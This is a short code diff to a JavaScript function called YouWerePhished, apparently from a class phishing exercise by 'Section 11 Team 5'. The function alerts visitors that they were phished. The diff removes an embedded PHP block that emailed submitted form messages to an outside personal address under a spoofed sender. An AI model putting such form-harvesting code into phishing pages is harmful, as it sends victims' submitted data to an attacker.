@@ -178,10 +178,6 @@ function YouWerePhished() {
     console.log(window.location.href);
     
     alert("You were just phished by Section 11 Team 5! Better Luck next time.");
-    <?php
-    {
-    mail("tdebbad@gmail.com", "Form to email message", $_POST["message"], "From: phishers@umail.com");
-  }
-    ?>
+    
 
   </script>
